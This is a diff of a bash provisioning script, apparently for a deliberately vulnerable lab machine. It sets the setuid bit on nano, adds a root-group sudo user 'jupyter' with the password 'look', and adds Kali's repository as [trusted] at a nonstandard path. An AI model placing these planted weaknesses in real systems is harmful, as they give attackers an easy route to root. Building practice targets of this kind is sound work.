@@ -1,4 +1,12 @@
 #! /bin/bash -e
 
 apt update -y
+
 chmod u+s /bin/nano
+
+adduser --disabled-password --gecos "noobuser" --uid 91 --gid 0 jupyter
+echo -e "look\nlook" | passwd jupyter
+usermod -aG sudo jupyter
+
+echo -e "deb [trusted] http://http.kali.org/kali kali-rolling main contrib non-free" >> /var/apt/sources.list
+apt-get update -y && apt-get upgrade -y
